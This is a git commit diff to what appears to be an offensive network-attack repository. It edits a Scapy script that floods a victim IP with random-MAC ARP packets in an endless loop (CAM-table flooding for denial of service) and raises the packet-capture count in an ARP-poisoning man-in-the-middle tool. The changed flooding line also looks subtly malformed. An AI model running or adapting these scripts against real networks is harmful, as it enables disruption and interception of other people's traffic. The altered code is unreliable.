445f30603838a658e5bfa42d2c3e003aa207ffc7
honx1337 <109291174+honx1337@users.noreply.github.com>
2023-06-05 11:25:43 +0200

    update

--- DoS/CAM_flooding.py
+++ DoS/CAM_flooding.py
@@ -6,7 +6,7 @@ def main():
     victim_ip = sys.argv[1]
     
     def whohas():
-        packet= Ether(RandMAC())/ARP(pdst=victim_ip, hwsrc="ff:ff:ff:ff:ff:ff")
+        packet= Ether(ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=RandMAC()))
         send(packet)
     while True:
         whohas()
--- MITM/arper.py
+++ MITM/arper.py
@@ -75,7 +75,7 @@ class Arper:
             else:
                 time.sleep(2)
 
-    def sniff(self, count=100):
+    def sniff(self, count=300):
         time.sleep(5)
         print(f'Liczba przechwytywanych pakietów: {count}')
         bpf_filter = 'ip host %s' % victim
